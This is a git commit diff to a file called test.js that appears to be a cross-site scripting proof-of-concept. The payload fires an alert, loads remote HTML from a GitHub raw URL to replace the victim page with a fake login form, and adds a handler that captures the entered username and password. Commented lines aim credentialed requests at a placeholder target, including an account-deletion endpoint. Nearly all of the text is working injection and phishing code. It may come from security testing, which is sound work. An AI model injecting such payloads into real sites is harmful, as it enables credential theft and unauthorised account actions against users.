51d0d693f04dad67332d897ef2f6a3399417b50f
achraf4test <112291751+achraf4test@users.noreply.github.com>
2023-05-05 16:17:30 +0100

    Update test.js

--- test.js
+++ test.js
@@ -1,4 +1,22 @@
 alert(1337);//
 fetch("https://raw.githubusercontent.com/achraf4test/onemoretest/main/test.html").then(res=>res.text()).then(res => {
-    document.body.innerHTML = res;
+  document.body.innerHTML = res;
+
+  const form = document.querySelector('#aa');
+
+  form.addEventListener("submit", function(evt) {
+    evt.preventDefault();
+
+    let login = document.querySelector('#user').value
+    let pass = document.querySelector('#pass').value
+    alert('Login: ' + login + " password: " + pass);
+
+    return;
+  }, true);
 })
+
+
+// fetch("https://target/en/users", { "method": "POST", "credentials": "include"})
+
+
+// fetch("https://target/en/user/settings/delete")
